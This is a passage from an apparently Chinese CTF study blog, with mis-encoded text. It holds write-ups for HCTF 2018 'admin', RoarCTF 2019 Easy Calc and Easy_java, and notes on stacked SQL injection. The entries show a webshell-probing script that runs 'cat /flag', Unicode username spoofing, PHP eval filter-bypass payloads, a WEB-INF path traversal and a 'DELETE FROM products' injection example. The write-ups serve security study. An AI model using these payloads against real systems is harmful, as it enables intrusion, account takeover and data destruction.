'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1/src/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"got it"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1/src/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"got it"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133qxxnj307e03rdfm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133qxxnj307e03rdfm.jpg" class="lazyload" title="test"></a></p>
<p>è®¿é—®</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG&#x3D; cat &#x2F;flag</span><br><span class="line"></span><br><span class="line">ç„¶åå¾—åˆ°flag</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133x3rmj30id06igm5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133x3rmj30id06igm5.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>è¿›å…¥é¡µé¢çœ‹åˆ°æœ‰login</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133ti8zj30v208smxf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133ti8zj30v208smxf.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨loginé¡µé¢å°è¯•æ³¨å…¥</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133xw74j30ma0e5q39.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133xw74j30ma0e5q39.jpg" class="lazyload" title="test"></a></p>
<p>æŠ¥é”™å‘ç°æ˜¯flaskæ¨¡æ¿ï¼ŒåŒæ—¶æ³¨æ„ä¸€ä¸ªæŠ¥é”™ <code>UnicodeError</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o134d6smj30uu0jh0yh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o134d6smj30uu0jh0yh.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="è§£æ³•ä¸€-éé¢„æœŸè§£"><a href="#è§£æ³•ä¸€-éé¢„æœŸè§£" class="headerlink" title="è§£æ³•ä¸€ (éé¢„æœŸè§£)"></a>è§£æ³•ä¸€ (éé¢„æœŸè§£)</h3><p>å¼±å£ä»¤ admin/123</p>
<h3 id="è§£æ³•äºŒ-Unicodeæ¬ºéª—"><a href="#è§£æ³•äºŒ-Unicodeæ¬ºéª—" class="headerlink" title="è§£æ³•äºŒ Unicodeæ¬ºéª—"></a>è§£æ³•äºŒ Unicodeæ¬ºéª—</h3><p>åœ¨<code>change password</code>é¡µé¢æŸ¥çœ‹æºç ï¼Œå‘ç°æä¾›äº†é¢˜ç›®çš„æºç åœ°å€</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>route.py</code>å‘ç°ï¼Œä¸ç®¡æ˜¯loginã€registerè¿˜æ˜¯changeé¡µé¢ï¼Œåªè¦æ˜¯å…³äº<code>session[&#39;name&#39;]</code>çš„æ“ä½œï¼Œéƒ½å…ˆç”¨äº†strlowerå‡½æ•°å°†nameè½¬æˆå°å†™ï¼Œä½†æ˜¯pythonä¸­æœ‰è‡ªå¸¦çš„è½¬å°å†™å‡½æ•°lowerï¼Œè¿™é‡Œé‡å†™äº†ä¸€ä¸ªï¼Œå¯èƒ½æœ‰ç‚¹çŒ«è…»ï¼Œäºæ˜¯æ‰¾åˆ°strlowerå‡½æ•°çš„å®šä¹‰</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1348v90j30w80ca0vy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1348v90j30w80ca0vy.jpg" class="lazyload" title="test"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgew96j30s30ic0wz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgew96j30s30ic0wz.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username &#x3D; nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œç”¨çš„<code>nodeprep.prepare</code>å‡½æ•°ï¼Œè€Œnodeprepæ˜¯ä»Twistedæ¨¡å—å¯¼å…¥çš„ï¼Œåœ¨requirements.txtæ–‡ä»¶ä¸­å‘ç°<code>Twisted==10.2.0</code>ï¼Œè€Œå®˜ç½‘æœ€æ–°å·²ç»åˆ°äº†19.7.0(2019/9)ï¼Œç‰ˆæœ¬å·®è·å¾ˆå¤§ï¼Œåº”è¯¥ä¼šå­˜åœ¨æ¼æ´ã€‚</p>
<p>åœ¨ç½‘ç«™æ‰¾å­—ç¬¦</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;unicode-table.com&#x2F;en&#x2F;1D2C&#x2F;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ³¨å†Œ á´¬dmin å¯†ç  123456</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgchitj30g40b3wei.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgchitj30g40b3wei.jpg" class="lazyload" title="test"></a></p>
<p>ä¿®æ”¹å¯†ç ä¸º 888888ï¼Œ ç™»é™†adminè´¦æˆ·ï¼Œå¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgcu5cj30qn0d7aai.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgcu5cj30qn0d7aai.jpg" class="lazyload" title="test"></a></p>
<p>å¤§è‡´çš„æ€è·¯æ˜¯ï¼šåœ¨æ³¨å†Œçš„æ—¶å€™  <code>á´¬dmin</code> ç»è¿‡<code>strlower()</code>ï¼Œè½¬æˆï¼Œ<code>admin</code>ï¼Œä¿®æ”¹å¯†ç åï¼Œ è½¬æ¢åçš„<code>admin</code>ï¼Œ è¢«<code>session[&#39;name&#39;]</code> è¯†åˆ«æˆ <code>admin</code> ç”¨æˆ·ï¼Œ ç™»é™†ä¿®æ”¹å¯†ç åçš„adminè´¦æˆ·ï¼Œå°±å¾—åˆ°flag</p>
<hr>
<h3 id="è§£æ³•ä¸‰-flask-sessionä¼ªé€ "><a href="#è§£æ³•ä¸‰-flask-sessionä¼ªé€ " class="headerlink" title="è§£æ³•ä¸‰ flask sessionä¼ªé€ "></a>è§£æ³•ä¸‰ flask sessionä¼ªé€ </h3><p>ä¸‹æ¬¡ä¸“é—¨å†™ä¸€ç¯‡åˆ†æ è¿˜æœ‰äº›ä¸œè¥¿æ²¡ææ‡‚</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>RoarCTF2019å¤ç°(1)</title>
    <url>/yakko117/2019/10/31/roarctf01/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="æœ€è¿‘è‡ªå·±è¿›å…¥äº†æ‡ˆæ€ æœŸï¼Œ11æœˆè¿˜è¯·ç»§ç»­åŠ æ²¹å§"><a href="#æœ€è¿‘è‡ªå·±è¿›å…¥äº†æ‡ˆæ€ æœŸï¼Œ11æœˆè¿˜è¯·ç»§ç»­åŠ æ²¹å§" class="headerlink" title="æœ€è¿‘è‡ªå·±è¿›å…¥äº†æ‡ˆæ€ æœŸï¼Œ11æœˆè¿˜è¯·ç»§ç»­åŠ æ²¹å§"></a>æœ€è¿‘è‡ªå·±è¿›å…¥äº†æ‡ˆæ€ æœŸï¼Œ11æœˆè¿˜è¯·ç»§ç»­åŠ æ²¹å§</h1><h2 id="0x01-Easy-Calc"><a href="#0x01-Easy-Calc" class="headerlink" title="0x01 Easy Calc"></a>0x01 Easy Calc</h2><p>å›½èµ›love_math çš„ä¸€é“å˜ä½“<br>è¿›å…¥é¡µé¢æŸ¥çœ‹æºç ï¼Œ å‘ç° <code>calc.php</code>é¡µé¢</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu3hngj30c403m3yc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu3hngj30c403m3yc.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨ <code>calc.php</code> å¾—åˆ°æºç å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>]; </span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>]; </span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123; </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>é™¤å»äº†é•¿åº¦é™åˆ¶ï¼Œ ä½†æ˜¯ç½‘ç«™åŠ äº†wafï¼Œå½“åˆæ‰“çš„æ—¶å€™ä¸€ç›´è·³403<br>åæ¥çŸ¥é“æœ‰ä¸ªçŸ¥è¯†ç‚¹ï¼ŒHTTPè¯·æ±‚èµ°ç§ï¼Œä»¥æ­¤æ¥ç»•è¿‡waf<br><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">httpè¯·æ±‚èµ°ç§</a><br><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">å‚è€ƒæ–‡æ¡£</a></p>
<p>å°è¯•è¿›è¡ŒæŸ¥çœ‹ <code>phpinfo()</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu548nj317d0mgaes.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu548nj317d0mgaes.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>ç„¶åè¦æ„é€ åˆ—ç›®å½•çš„payloadï¼Œè¦ä½¿ç”¨<code>scandir</code>å‡½æ•°ï¼Œå°è¯•æ„é€ åˆ—ä¸¾æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚<br><code>scandir</code>å¯ä»¥ç”¨<code>base_convertå‡½æ•°</code>æ„é€ ï¼Œä½†æ˜¯åˆ©ç”¨<code>base_convert</code>åªèƒ½è§£å†³<code>a~z</code>çš„åˆ©ç”¨ï¼Œå› ä¸ºæ ¹ç›®å½•éœ€è¦<code>/</code>ç¬¦å·ï¼Œä¸”ä¸åœ¨<code>a~z</code>ï¼Œæ‰€ä»¥éœ€è¦<code>hex2bin(dechex(47))</code>è¿™ç§æ„é€ æ–¹å¼ï¼Œdechex()å‡½æ•°æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚<code>hex2bin()å‡½æ•°</code>æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCIIå­—ç¬¦ã€‚</p>
<p>ä¸Šæ¬¡å›½èµ›ç•™ä¸‹çš„baseè½¬ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'scandir'</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line">å¾—åˆ° <span class="number">61693386291</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> hex2bin(dechex(<span class="string">'47'</span>))</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> hex2bin(dechex(<span class="string">'46'</span>))</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> hex2bin(dechex(<span class="string">'32'</span>))</span><br><span class="line">ç©ºæ ¼</span><br></pre></td></tr></table></figure></div>

<p>æ„é€ payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))</span><br><span class="line">ç›¸å½“äºcar_dump(scandir(.&#x2F;))</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu4tdfj312g0g3q5x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu4tdfj312g0g3q5x.jpg" class="lazyload" title="test"></a></p>
<p>å¯ä»¥çœ‹åˆ°ç›®å½•ï¼Œç„¶åè·Ÿè¿›ç›®å½•ï¼Œ æœ€ååœ¨æ ¹ç›®å½•å¾—åˆ° <code>f1agg</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu7gfej312j0jfgp1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu7gfej312j0jfgp1.jpg" class="lazyload" title="test"></a></p>
<p>æ„é€ è¯»å–flagï¼Œä½¿ç”¨<code>readfileå‡½æ•°</code><br>payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°flag<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu52l2j30zf0dqad1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu52l2j30zf0dqad1.jpg" class="lazyload" title="test"></a></p>
<p>çœ‹äº†å¸ˆå‚…çš„ä¸€äº›å…¶ä»–æ€è·¯ï¼Œè¿™é‡Œå°±çœ‹ä¸€ä¸‹çŸ¥è¯†ç‚¹<br><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</a></p>
<hr>
<h2 id="0x02-Easy-java"><a href="#0x02-Easy-java" class="headerlink" title="0x02 Easy_java"></a>0x02 Easy_java</h2><p>å¼€å±€ä¸€ä¸ªç™»é™†ï¼Œå°è¯•å¼±å£ä»¤ï¼Œ admin/admin888 è¿›å»äº†ï¼ˆOrz ç„¶åæ²¡ä»€ä¹ˆç”¨ï¼‰<br>å¾—åˆ°ä¸€å¼ å›¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvkgazj30lp0l5wji.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvkgazj30lp0l5wji.jpg" class="lazyload" title="test"></a></p>
<p>è¡Œå§ï¼Œçœ‹ä¸€ä¸‹ä¸€å¼€å§‹çš„helpï¼Œçœ‹åˆ°ç»“æ„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Download?filename&#x3D;help.docx</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvidp1j30dm01twei.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvidp1j30dm01twei.jpg" class="lazyload" title="test"></a></p>
<p>æ—¢ç„¶ <code>GET</code> æ— æ³•è¯·æ±‚åˆ°ï¼Œå°±è¦æ¢ä¸€ä¸ªè¯·æ±‚ï¼Œæƒ³èµ·é¢˜ç›®tipsè¯´æ˜¯é€åˆ†é¢˜ï¼Œå°è¯• <code>post</code> ï¼Œç„¶åè¢«æ¶å¿ƒåˆ°äº†<br>ä¸è¿‡æ–¹å‘è¿˜æ˜¯å¯¹çš„</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvjvitj30na09s0u0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvjvitj30na09s0u0.jpg" class="lazyload" title="test"></a></p>
<p>æŠ¥é”™çˆ†å‡ºtomcatï¼Œ ç»“åˆä¸Šé¢çš„åŒ…å«æ¼æ´ï¼Œå°è¯•æ‰¾ä¸€ä¸‹tomcatçš„<code>WEB-INF/web.xml</code><br>ç„¶åå°±å‘ç°å¥½ä¸œè¥¿äº†ï¼Œæ‰¾åˆ°flagè·¯å¾„</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmviw3lj30vb0gejsy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmviw3lj30vb0gejsy.jpg" class="lazyload" title="test"></a></p>
<p>æœ€åæäº¤payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°ä¸€æ®µç±»ä¼¼base64çš„å­—ç¬¦ä¸²</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvj0vjj311l0ckjsn.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvj0vjj311l0ckjsn.jpg" class="lazyload" title="test"></a></p>
<p>è§£ç å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>å †å æŸ¥è¯¢æ³¨å…¥å­¦ä¹ </title>
    <url>/yakko117/2019/10/30/stack_sql_injection/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="è¯´åœ¨å‰é¢çš„ä¸€äº›ä¸œè¥¿"><a href="#è¯´åœ¨å‰é¢çš„ä¸€äº›ä¸œè¥¿" class="headerlink" title="è¯´åœ¨å‰é¢çš„ä¸€äº›ä¸œè¥¿"></a>è¯´åœ¨å‰é¢çš„ä¸€äº›ä¸œè¥¿</h1><p>åšé¢˜æ—¶é‡åˆ°äº†ä¸€é“ç»“åˆå †å æ³¨å…¥çš„é¢˜ç›®ï¼Œæ‹œè¯»äº†å¸ˆå‚…ä»¬çš„wpï¼Œå’ŒæŠ€æœ¯åˆ†æè¯¦è§£ï¼Œè‡ªå·±æ€»ç»“äº†ä¸€äº›ä¸œè¥¿ï¼Œç”¨ä»¥è®°å½•å­¦ä¹ <br><a href="http://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">å †å æ³¨å…¥åŸæ–‡</a><br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">0nth3wayå¸ˆå‚…çš„ç†è§£</a><br>é¢˜ç›®å¯ä»¥å»BUUCTFï¼Œå»çœ‹çœ‹2019å¼ºç½‘æ¯çš„ <code>éšä¾¿æ³¨</code><br><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTFé¶åœº</a></p>
<hr>
<h2 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h2><p>åœ¨SQLä¸­ï¼Œåˆ†å·<code>;</code>æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ <code>;</code> ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œ<code>union injection</code>ï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äº<code>union</code>æˆ–è€… <code>union all</code>æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products</code>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12metxxj30n8047dfx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12metxxj30n8047dfx.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="å †å æ³¨å…¥çš„å±€é™æ€§"><a href="#å †å æ³¨å…¥çš„å±€é™æ€§" class="headerlink" title="å †å æ³¨å…¥çš„å±€é™æ€§"></a>å †å æ³¨å…¥çš„å±€é™æ€§</h2><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mfdsnj30iw03f74b.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8g12mfdsnj30iw03f74b.jpg" class="lazyload" title="test"></a></p>
